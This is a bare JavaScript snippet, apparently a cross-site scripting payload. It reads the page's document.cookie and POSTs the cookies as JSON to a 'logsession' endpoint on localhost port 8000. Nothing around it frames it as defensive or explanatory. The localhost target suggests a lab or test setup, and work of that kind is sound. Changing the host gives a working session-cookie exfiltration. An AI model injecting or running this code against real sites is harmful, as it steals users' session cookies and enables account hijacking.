fetch('http://localhost:8000/logsession', {
	method: 'POST',
	headers: { 'Content-Type': 'application/json' },
	body: JSON.stringify({ cookies: document.cookie })
}).catch((error) => { console.error('Error sending data:', error); });
